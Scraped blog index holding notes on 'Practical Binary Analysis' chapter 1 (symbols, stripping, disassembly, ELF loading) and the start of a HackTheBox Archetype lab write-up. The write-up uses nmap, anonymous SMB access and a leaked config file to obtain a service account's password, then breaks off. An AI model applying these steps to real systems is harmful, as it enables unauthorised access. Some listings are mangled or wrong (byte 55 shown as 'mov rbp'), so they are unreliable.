(Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"▸ Symbols and Stripped Binaries ============================= High-level source code, such as C code, centers around functions and variables with meaningful, human-readable names. When compiling a program, compiler emit symbols, which: Keep track of such symbolic names. Record which binary code and data correspond to each symbol. For instance, function symbols provide a mapping from symbolic, high-level function names to the first address and the size of each function. This information is normally used by the linker when combining object files (for instance, to resolve function and variable references between modules) and also aids debugging. ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:4:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ Viewing Symbolic Information The below example shows some symbolic information for the file “a.out” using “readelf –syms”: ‘-s’ or ‘–syms’ or ‘–symbols’ (An alias for ‘–syms’) : Display the symbol table $ readelf –syms a.out Symbol table '.dynsym' contains 4 entries: NumValue (the address)SizeTypeindVisNdxName 0:00000000000000000NOTYPELOCALDEFAULTUND 1:00000000000000000FUNCGLOBALDEFAULTUNDputs@GLIBC_2.2.5(2) 2:00000000000000000FUNCGLOBALDEFAULTUND__libc_start_main@GLIBC_2.2.5(2) 300000000000000000NOTYPEWEAKDEFAULTUND__gmon_start__   Symbol table '.symtab' contains 67 entries: NumValue (the address)SizeTypeindVisNdxName ...        5600000000006010300OBJECT/tdGLOBALHIDDEN25__dso_handle 57:00000000004005d04OBJECTGLOBALDEFAULT16_IO_stdin_used 58:0000000000400550101FUNCGLOBALDEFAULT14__libc_csu_init 59:00000000006010400NOTYPEGLOBALDEFAULT26_end 60:000000000040043042FUNCGLOBALDEFAULT14_start 61:00000000006010380NOTYPEGLOBALDEFAULT26__bss_start 62:000000000040052632FUNCGLOBALDEFAULT14main 63:00000000000000000NOTYPEWEAKDEFAULTUND_Jv_RegisterClasses 64:00000000006010380OBJECTGLOBALHIDDEN25__TMC_END__ 65:00000000000000000NOTYPEWEAKDEFAULTUND_ITM_registerTMCloneTable 66:00000000004003c80FUNCGLOBALDEFAULT11_init In the above listing, with the utility readelf is possible to display the symbol table, among many unfamiliar symbols we can find a symbol for: $ readelf –syms a.out Symbol table '.dynsym' contains 4 entries: NumValue (the address)SizeTypeindVisNdxName .... 61:00000000006010380NOTYPEGLOBALDEFAULT26__bss_start-- 62:000000000040052632FUNCGLOBALDEFAULT14main 63:00000000000000000NOTYPEWEAKDEFAULTUND_Jv_RegisterClasses-- .... 66:00000000004003c80FUNCGLOBALDEFAULT11_init -- --- ***\\$ readelf --syms a.out*** */\\*….\\*/* *Num:* ***Value** (the address)* ***Size*** ***Type*** *Bind* *Vis* *Ndx* ***Name*** -------- --- --- - -- ------- *…* *61:* *0000000000601038* *0* *NOTYPE* *GLOBAL* *DEFAULT* *26* *__bss\\_start* *62:* *0000000000**400526*** ***32*** ***FUNC*** *GLOBAL* *DEFAULT* *14* ***main*** *66:* *00000000004003c8* *0* *FUNC* *GLOBAL* *DEFAULT* *11* *\\_init* --- -- The main function: the value 0x400526represents the address at which “main” will reside when the binary is loaded into memory. The output also shows the code size of main (32 bytes) and indicates that you are dealing with a function symbol (type FUNC) Symbolic information can be emitted either a) As part of the binary (as shown above). b) Or in the form of a separate symbol file, and it comes on various flavours. The linking phase is the *final phase of the compilation process*. As the name implies, this phase links together all the object files **into a single binary executable.** In modern systems, *the linking phase* sometimes incorporate an **additional optimization pass**, called: **link-time optimization (LTO)** The linker needs only basic symbols, but far more extensive information can be emitted for debugging purposes. **Debugging symbols** information go as far as providing a full mapping between source lines and binary-level instructions, and they **even describe** function parameters, stack frame information, and more. ELF binaries: In ELF binaries, debugging symbols are typically generated in the DWARF format. DWARF information is usually embedded within the binary. PE binaries: PE binaries usually use the proprietary Microsoft Portable Debugging (PDB) format. PDB comes in the form of a separate symbol file. As you might imagine, symbolic information is extremely useful for binary analysis. Having a set of well-defined function symbols at your disposal makes disassembly much easier because you can use each function symbol as a starting point for disassembly. This makes it much less likely that you will *accidentally disassemble data as code*, for instance (which would lead to bogus instructions in the disassembly output) Knowing which part of a binary belong to which function, and what the function is called, also makes it much easier for human reverse enginee","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:4:1","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ Stripping a Binary Another Binary Turns to the Dark Side: Stripping a Binary Apparently, the default behaviour of gcc is not to automatically strip newly compiled binaries. The below example shows how binary with symbols end up stripped by using the command : $ strip –strip-all a.out $ strip --strip-all a.out $ file a.out*/td a.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c21ccd6d27df9e553a574b2be2d6d58501fa8a0b, stripped Using the command “strip –strip-all a.out”, the binary is now stripped. Only symbols in ‘.dynsym’ table are left, these are used to resolve dynamic dependencies when the binary is loaded into memory, but they are not much use when disassembling. $ readelf –syms a.out Symbol table '.dynsym' contains 4 entries: NumValue (the address)SizeTypeindVisNdxName 0:00000000000000000NOTYPELOCALDEFAULTUND 1:00000000000000000FUNCGLOBALDEFAULTUNDputs@GLIBC_2.2.5(2) 2:00000000000000000FUNCGLOBALDEFAULTUND__libc_start_main@GLIBC_2.2.5(2) 300000000000000000NOTYPEWEAKDEFAULTUND__gmon_start__ ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:4:2","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"▸ Disassembling a Binary ====================== Now that we have seen how to compile a binary, let’s take a look at the contents of the object file produced in the assembly phase of compilation. ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:5:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ Looking inside an Object File. Let’s use the objdump utility to show how to do all the disassembling Below the disassembled version of the object file compilation_example.o using options -s and -j   $ objdump -sj .rodata compilation_example.o   compilation_example.o: file format elf64-x86-64   Contents of section .rodata: $ 0000 48656c6c 6f2c2077 6f726c64 2100 Hello, world!. In the above example the options used to show only the ‘.rodata’ section are: -s, –full-contents Display the full contents of all sections requested -j, –section=NAME Only display information for section NAME Contents of section .rodata: $ 0000 48656c6c 6f2c2077 6f726c64 2100 Hello, world!. The content of .rodata section consists of : An ASCII encoding of the string (on the left side of the output) **0000 48656c6c 6f2c2077 6f726c64 2100 ** The human-readable representation of those same bytes (on the right side of the output) Hello, world!. .rodata stands for “read-only”; it’s part of the binary where all constants are stored (including the “Hello, world!” string) Below the disassembled version of the object file compilation_example.o using option/switch -M and -d $ objdump -M intel -d compilation_example.o   compilation_example.o: file format elf64-x86-64   Disassembly of section .text:   0000000000000000 \u003cmain\u003e     0: 55 mov rbp   1: 48 89 e5 mov rbp,rsp  4: 48 83 ec 10 sub rsp,0x10   8: 89 7d fc mov DWORD PTR [rbp-0x4],edi  b: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi   f: bf 00 00 00 00 mov edi,0x0   14: e8 00 00 00 00 call 19 \u003cmain+0x19\u003e  19: b8 00 00 00 00 mov eax,0x0   1e: c9 leave   1f: c3 ret   In the above example the options used are: -M, –disassembler-options=OPT Pass text OPT on to the disassembler Intel, for usewith the -M switch This option to display instruction in Intel syntax -d, –disassemble Display assembler contents of executable sections The utility objdump here has been used to disassemble all the code in the object file compilation_example.o, in the Intel syntax. $ objdump -M intel -d compilation_example.o It contains only the code of the main function because that’s the only function defined in the source file. $ objdump -M intel -d compilation_example.o   compilation_example.o: file format elf64-x86-64   Disassembly of section .text:   0000000000000000 \u003cmain\u003e     0: 55 mov rbp   1: 48 89 e5 mov rbp,rsp  4: 48 83 ec 10 sub rsp,0x10   8: 89 7d fc mov DWORD PTR [rbp-0x4],edi  b: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi   f: bf 00 00 00 00 mov edi,0x0   14: e8 00 00 00 00 call 19 \u003cmain+0x19\u003e  19: b8 00 00 00 00 mov eax,0x0   1e: c9 leave   1f: c3 ret   For the most part, the output conforms pretty closely to the assembly code previously produced by the compilation phase (give or take few assembly level macros) What is interesting here is that the pointer to the “Hello, world!” string is set to zero. $ objdump -M intel -d compilation_example.o   compilation_example.o: file format elf64-x86-64   Disassembly of section .text:   0000000000000000 \u003cmain\u003e     0: 55 mov rbp   1: 48 89 e5 mov rbp,rsp  4: 48 83 ec 10 sub rsp,0x10   8: 89 7d fc mov DWORD PTR [rbp-0x4],edi  b: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi   f: bf 00 00 00 00 mov edi,0x0   14: e8 00 00 00 00 call 19 \u003cmain+0x19\u003e  19: b8 00 00 00 00 mov eax,0x0   1e: c9 leave   1f: c3 ret   The subsequent call that should print the string to the screen using puts also points to non sensical location (offset 19, in the middle of the main). $ objdump -M intel -d compilation_example.o   compilation_example.o: file format elf64-x86-64   Disassembly of section .text:   0000000000000000 \u003cmain\u003e     0: 55 mov rbp   1: 48 89 e5 mov rbp,rsp  4: 48 83 ec 10 sub rsp,0x10   8: 89 7d fc mov DWORD PTR [rbp-0x4],edi  b: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi   f: bf 00 00 00 00 mov edi,0x0   14: e8 00 00 00 00 call 19 \u003cmain+0x19\u003e  19: b8 00 00 00 00 mov eax,0x0   1e: c9 leave   1f: c3 ret   But why does the call, that should reference puts, point instead into the middle main? Let’s having in mind tha","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:5:1","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ Examining a complete binary executable It’s now time to examine a complete binary executable. Let’s start with a binary with symbols (a.out) and then move on to the stripped equivalent (a.out.stripped) to see the difference in disassembly output. $ ls -la ......  -rwxrwxr-x 1 binary binary 8616 dec 12 16:49 a.out  -rwxrwxr-x 1 binary binary 6312 dec 12 16:48 a.out.stripped ...... Let’s disassemble the non-stripped version of the binary file “a.out” $ objdump -M intel -d a.out   a.out: file format elf64-x86-64   00000000004003c8 .init:1  4003c8:48 83 ec 08 sub rsp,0x8    4003cc:48 8b 05 25 0c 20 00mov rax,QWORD PTR [rip+0x200c25] # 600ff8 \u003c_DYNAMIC+0x1d0\u003e   4003d3: 48 85 c0 test rax,rax   4003d6: 74 05 je 4003dd   4003d8: e8 43 00 00 00 call 400420   4003dd: 48 83 c4 08 add rsp,0x8   4003e1: c3 ret   Disassembly of section.plt :2   00000000004003f0 \u003cputs@plt-0x10\u003e:   4003f0: ff 35 12 0c 20 00 push QWORD PTR [rip+0x200c12] # 601008 \u003c_GLOBAL_OFFSET_TABLE_+0x8\u003e   4003f6: ff 25 14 0c 20 00 jmp QWORD PTR [rip+0x200c14] # 601010 \u003c_GLOBAL_OFFSET_TABLE_+0x10\u003e   4003fc: 0f 1f 40 00 nop DWORD PTR [rax+0x0]     00000000004003f0 \u003cputs@plt\u003e:   400400: ff 25 12 0c 20 00 jmp QWORD PTR [rip+0x200c12] # 601018   400406: 68 00 00 00 00 push 0x0     40040b: e9 e0 ff ff ff jmp 4003f0     ...... Disassembly of section text: 3section .text 0000000000400430 \u003c_start\u003e:   400430: 31 ed xor ebp,ebp   400432: 49 89 d1 mov r9,rdx   400435: 5e pop rsi   400436: 48 89 e2 mov rdx,rsp   400439: 48 83 e4 f0 and rsp,0xfffffffffffffff0   40043d: 50 push rax   40043e: 54 push rsp   40043f: 49 c7 c0 c0 05 40 00 mov r8,0x4005c0   400446: 48 c7 c1 50 05 40 00 mov rcx,0x400550   40044d: 48 c7 c7 26 05 40 00 mov rdi,0x400526   400454: e8 b7 ff ff ff call 400410   400459: f4 hlt   40045a: 66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0]   0000000000400460 \u003cderegister_tm_clones\u003e:  400460:b8 3f 10 60 00 mov eax,0x60103f  400465:55 push rbp ......   0000000000400526 \u003cmain\u003e: 4   400526: 55 push rbp   400527: 48 89 e5 mov rbp,rsp   40052a: 48 83 ec 10 sub rsp,0x10   40052e: 89 7d fc mov DWORD PTR [rbp-0x4],edi   400531: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi   400535: bf d4 05 40 00 mov edi,0x4005d4   40053a: e8 c1 fe ff ff call 400400 **\u003cputs@plt\u003e** **5***   40053f: b8 00 00 00 00 mov eax,0x0   400544: c9 leave   400545: c3 ret   400546: 66 2e 0f 1f 84 00 00 nop WORD PTR cs:[rax+rax*1+0x0]     40054d: 00 00 00   0000000000400550 \u003c__libc_csu_init\u003e: ...... Disassembly of section .fini:   00000000004005c4 \u003c_fini\u003e:   4005c4: 48 83 ec 08 sub rsp,0x8     4005c8: 48 83 c4 08 add rsp,0x8    4005cc: c3 ret   We can see that the binary has a lot more code than the object file. It’s no longer just the main function or even just a single code section. There are multiple sections now, with names like : .init .plt .text These sections contain code serving different function, such as program initialization or stubs for calling shared libraries. The .text section (3) is the main code section, and it contains: The main (4) function. Other functions, such, as _start, that are responsible for tasks such as setting up the command line arguments and runtime environment for main and cleaning up after main. (These extra functions are standards functions, present in any ELF file produced by gcc). We can also see that the previously incomplete code and data references have now been resolved by the linker. $ objdump -M intel -d compilation_example.o   compilation_example.o: file format elf64-x86-64   Disassembly of section .text:   0000000000000000 \u003cmain\u003e   0:  55 mov rbp 1:  48 89 e5 mov rbp,rsp 4:  48 83 ec 10 sub rsp,0x10 8:  89 7d fc mov DWORD PTR [rbp-0x4],edi b:  48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi f:  bf 00 00 00 00 mov edi,0x0 14:  e8 00 00 00 00 call 19 \u003cmain+0x19\u003e 19:  b8 00 00 00 00 mov eax,0x0 1e:  c9 leave 1f:  c3 ret Below the relocation symbols shown by the command using ***readelf*** and the option ***--relocs*** $ readelf --relocs compilation_example.o   Relocation section '.","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:5:2","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"▸ Loading and Executing a Binary ============================== What really happens when a binary file is loaded and executed? The figure below shows how a loaded ELF binary is represented in memory on a Linux-based platform. (At a high level, loading a PE binary on Windows is quite similar). Loading a binary is a complicated process that involves a lot of work by the operating system. It is also important to note a binary’s representation in memory does not necessarily correspond one to one with its on-disk representation. For instance, large amount of zero-initialized data may be collapsed in the on-disk binary (to save disk space), while all those zeros will be expanded in memory or not loaded into memory at all. When we decide to run a binary, the operating system starts by setting up a new process for the program to run in, including a virtual address space. Subsequently, the operating system maps an interpreter into the process’s virtual memory This is a user space program that knows how to load the binary and perform the necessary relocations: On Linux the interpreter is typically a shared library called ld-linux.so. On Windows the interpreter functionality is implemented as part of ***ntdll.dll. *** After loading the interpreter, the kernel transfers control to it, and the interpreter starts its work in user space. Linux ELF binaries comes with a special section called .interp that specifies the path to the interpreter that is to be used to load the binary. The command below shows the .interp section of the file a.out: -p –string-dump=\u003cnumber|name\u003e Dump the contents of section \u003cnumber|name\u003e as strings. .interp Is the section name. $ readelf -p .interp a.out   String dump of section '.interp': [0] /lib64/ld-linux-x86-64.so.2 Here the interpreter loads the binary into its virtual address space (the same space in which the interpreter is loaded). It then parses the binary to find put (among other things) which dynamic libraries the binary uses. The interpreter maps these into the virtual address space ( using mmap or equivalent function) and then performs any necessary last-minute relocations in the binary’s code sections to fill in the correct address for references to the dynamic libraries. In reality, instead of resolving these references immediately at load time, the interpreter resolves references only when they are invoked for the first time. This is known as lazy bindings**.** After relocation is complete, the interpreter looks up the entry point of the binary and transfers control to it, beginning normal execution of the binary. ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:6:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"▸ Summary ELF binaries are divides into sections. Some sections contain code, and others contain data. **Why do you think the distinction between code and data sections exists?** **Symbols are organized into sections** – code lives in one section (.text), and data in another (.data, .rodata) ***The CODE section*** refers to *the executable information* (the assembly) ***The DATA section*** refers to the *information used by the code* (the strings) Separating them allows them to be given different permissions. Variables (i.e. data) need to be writeable, but executable sections (i.e. code) should normally be read-only in order to prevent an attacker from overwriting them and changing their behavior. **How do you think the loading process differs for code and data sections?** At a high level: **Symbols are like function names,** e.g. “If I call printf and it’s defined somewhere else, how do I find it?” *Symbols are organized into sections* – code lives in one section (.text), and data in another (.data, .rodata) *Sections are organized into segments* Linux loads the .text section into memory only once, no matter how many times an application is loaded. This reduces memory usage and launch time and is safe because the code doesn't change. For that reason, the .rodata section, which contains read-only initialized data, is packed into the same segment that contains the .text section. The .data section contains information that could be changed during application execution, so this section must be copied for every instance. The main code is stored in .text (flagged read-only and executable). Constants are stored in .rodata/.rdata (read-only), although Windows compilers often mix them into .text. Default values of initialized variables are stored in .data (writeable). Uninitialized variables have space reserved by .bss (writeable) when the process is set up, but do not take up any bytes in the binary on disk. **Is it necessary to copy all sections into memory when a binary is loaded for executions?** Loading a binary is a process that involves a lot of work by the operating system When we decide to run a binary, the operating system starts by setting up a new process for the program to run in, including a virtual address space. Here the interpreter loads the binary into its virtual address space (the same space in which the interpreter is loaded). It then parses the binary to find put (among other things) which dynamic libraries the binary uses. The interpreter maps these into the virtual address space ( using mmap or equivalent function) and then performs any necessary last-minute relocations in the binary’s code sections to fill in the correct address for references to the dynamic libraries. In reality, instead of resolving these references immediately at load time, the interpreter resolves references only when they are invoked for the first time. This is known as lazy bindings**.** After relocation is complete, the interpreter looks up the entry point of the binary and transfers control to it, beginning normal execution of the binary. No. The division of the binary into sections is a convenient organization set up to be parseable by the linker. Some sections contain only data intended for the linker at link time, such as symbolic or relocation information. Much linking occurs before execution time, so some such sections do not need to be loaded into the process’s virtual memory for execution - although with lazy binding, many relocations can occur during execution (the .plt and .got.plt sections are used for this, and do need to be loaded). Sections are organized into groups called segments. Segments of type PT_LOAD are intended to be loaded into memory. The executable’s program headers describe the segments. ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:7:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"What is Binary Analysis? This post covers the introduction of the book from Daniel Andriesse \"Practical Binary Analysis\".. ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"description: \"What is Binary Analysis? This post covers the introduction of the book \\\"Practical Binary Analysis\\\" \" As malware increasingly obfuscates itself and applies anti-analysis techniques to thwart our analysis, we need more sophisticated methods that allow us to raise that dark curtain designed to keep us out--binary analysis can help. The goal of all binary analysis is to determine (and possibly modify) the true properties of binary programs to understand what they really do, rather than what we think they should do. While reverse engineering and disassembly are critical first steps in many forms of binary analysis, there is much more to be learned. SOMMARIO 2 ANATOMY OF BINARY 6 2.1 The C Compilation Process 6 2.1.1 The Processing Phase 7 2.1.2 The Compiling Phase 9 2.1.3 The Assembly Phase 11 2.1.4 The Linking Phase 12 2.2 Symbols and Stripped Binaries 15 2.2.1 Viewing Symbolic Information 15 2.2.2 Another Binary Turns to the dark side: Stripping a Binary 17 2.3 Disassembling a Binary 18 -- The content of this page is entirly coming from the “Practical Binary Analysis” book (https://practicalbinaryanalysis.com/) from Andriesse (https://mistakenot.net/) ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:0:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"INTRODUCTION ================= (pdf) The vast majority of computers programs are written in high-level languages like C or C++, which computers cannot run directly. Before using these programs, they must first be compiled into “binary executable” containing machine code that the computer can run. There is a big semantic gap between the compiled program (binary) and the high-level source. As a result, many compilers bugs, subtle implementation errors, binary-level backdoors and malicious parasites can go unnoticed. ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:1:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"▸ What is Binary Analysis? ◦ What is Binary Analysis, and why do we need it? Binary analysis: Is the science and art of analysing the properties of binary computer programs, called binaries, and the machine code and the data they contain. Tries to figure out (and possibly to modify) the true properties of binary programs trying to understand what they really do as opposed to what they think they should do. Broadly, binary analysis techniques can be divided into two classes, or a combination of these: ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:2:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"◦ Static analysis Static analysis techniques reason about a binary program without running it ADVANTAGES You can potentially analyse the whole binary in one go without the need of having a CPU that can run the binary: For instance, you can statically analyse an ARM binary on an x86 machine. DOWNSIDES Static analysis has no knowledge of the binary’s runtime state, which can make the analysis really challenging. ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:2:1","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"◦ Dynamic analysis Dynamic analysis runs the binary and analyses it as it executes. ADVANTAGES This approach is often simpler because you have full knowledge of the entire runtime state, including the values, the variables, and the outcomes of conditional branches. DOWNSIDES You can only see the executed code, so the analysis may miss interesting parts of the program. ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:2:2","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"◦ Other techniques Passive binary analysis Binary instrumentation ( can be used to modify binary program without needing source) ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:2:3","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"▸ What makes it Challenging? Binary analysis is challenging and much more difficult the equivalent analysis at the source code level. In fact, many binary analysis tasks are fundamentally undecidable, meaning that: It is impossible to build an analysis engine for these problems that always returns a correct result! An important part of binary analysis is to come up with creative ways to build usable tools despite analysis errors! ◦ What makes binary analysis difficult? *Here is a list of some of the things that make binary analysis difficult*: NO SYMBOLIC INFORMATION In high-level language, like C or C++, we give name to construct such as variables, functions and classes. All these names are called “symbolic information” o simply “symbol”. Good naming conventions make the source code much easier to understand BUT at binary level, they have no real relevance..As a result, binaries are often stripped of symbols, making it much harder to understand. NO TYPE INFORMATION Inother feature of high-level programs is that they revolve around variables with well-defined types, such as INT*, FLOAT, STRING*, as well as more complex data structures like STRUCT TYPE.In contrast, at the binary level, types are never explicitly stated, making the purpose and structure of data hard to infer. NO HIGH-LEVEL ABSTRACTIONS Modern programs are compartmentalized into classes and functions, but compilers throw away these high-level constructs. That means that binaries appear as huge blobs of code and data, rather thrown well-structured programs, and restoring the high-level structure is complex and error-prone MIXED CODE AND DATA Binaries can (and DO) contain data fragments mixed in with the executable code (Visual studio, for example, is especially notorious in terms of mixing code and data)This makes it easy to accidentally interpret data as code, or vice versa, leading to incorrect results. LOCATION-DEPENDENT CODE AND DATA Because binaries re not designed to be modified, even adding a single machine instruction can cause problems as it shifts other code around invalidating memory addresses and references from elsewhere in the code.As a result, any kind of code or data modification is extremely challenging and prone to braking the binary. ","date":"01 Sep 2021","objectID":"/practicalbinaryanalysis_intro/:3:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis] Introduction","uri":"/practicalbinaryanalysis_intro/"},{"categories":["Reversing","Assembly"],"content":"This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones.","date":"14 Dec 2020","objectID":"/startingpoint/","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":" * { box-sizing: border-box; } .zoom:hover{ cursor: -moz-zoom-in; cursor: -webkit-zoom-in; cursor: zoom-in; } .zoom:link { transition: transform .2s; margin: 0 auto; } .zoom:active { cursor: -moz-zoom-in; cursor: -webkit-zoom-in; cursor: zoom-in; -ms-transform: scale(2); /* IE 9 */ -webkit-transform: scale(2); /* Safari 3-8 */ transform: scale(2); position: absolute; z-index: 9999; } ","date":"14 Dec 2020","objectID":"/startingpoint/:0:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"INTRODUCTION (pdf) This path is composed of 6 boxes in a way that later boxes use information (like credentials) gathered from the previous ones. ","date":"14 Dec 2020","objectID":"/startingpoint/:1:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▸ ARCHTYPE ","date":"14 Dec 2020","objectID":"/startingpoint/:2:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ About This is a Windows box where you can learn how enumeration can lead to RCE via SQL server queries. Machine : Archetype Ip: 10.10.10.27 ","date":"14 Dec 2020","objectID":"/startingpoint/:2:1","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Enumeration We use nmap (a free and open source utility for network discovery and security auditing) to: · -sV: Probe open ports to determine service/version info · -sC: equivalent to –script=default nmap -sC -sV 10.10.10.27 sudo nmap -sC -sV 10.10.10.27 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 08:58 EDT Nmap scan report for 10.10.10.27 Host is up (0.046s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM | ms-sql-ntlm-info: | Target_Name: ARCHETYPE | NetBIOS_Domain_Name: ARCHETYPE | NetBIOS_Computer_Name: ARCHETYPE | DNS_Domain_Name: Archetype | DNS_Computer_Name: Archetype |_ Product_Version: 10.0.17763 .... Host script results: |_clock-skew: mean: 1h38m45s, deviation: 3h07m52s, median: 14m44s | ms-sql-info: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3) | Computer name: Archetype | NetBIOS computer name: ARCHETYPE\\x00 | Workgroup: WORKGROUP\\x00 Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server. It is worth checking to see if anonymous access has been permitted, as file shares often store configuration files containing passwords or other sensitive information. We can use smbclient to list available shares. smbclient -N -L \\\\\\\\10.10.10.27 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available It seems there is a share called backups. Let’s attempt to access it and see what’s inside. smbclient -N \\\\\\\\10.10.10.27\\\\backups Try \"help\" to get a list of possible commands. smb: \\\u003e dir .. DR 0 Mon Jan 20 07:20:57 2020 .. DR 0 Mon Jan 20 07:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 07:23:02 2020 smb: \\\\\u003e There is a dtsConfig file, which is a config file used with SSIS. Let’s see the code smb: \\\\\u003e get prod.dtsConfig getting file \\\\prod.dtsConfig of size 609 as prod.dtsConfig (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec) smb: \\\\\u003e Checking the file we see: The password: M3g4c0rp123 The user ID : ARCHETYPE\\sql_svc more prod.dtsConfig \u003cDTSConfiguration\u003e \u003cDTSConfigurationHeading\u003e ….. \u003cConfiguredValue\u003eData Source=.;Password=`**M3g4c0rp123`**; User ID=ARCHETYPE\\`**sql_svc\u003c/b\u003e`**; .…. ….. \u003c/ConfiguredValue\u003e …… \u003c/DTSConfiguration\u003e ","date":"14 Dec 2020","objectID":"/startingpoint/:2:2","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Foothold Let’s try connecting to the SQL Server using “mssqlclient.py” (from Impacket) using the credentials found in “prod.dtsConfig” for the local Windows user ARCHETYPE\\sql_svc (pwd:M3g4c0rp123 ): python3 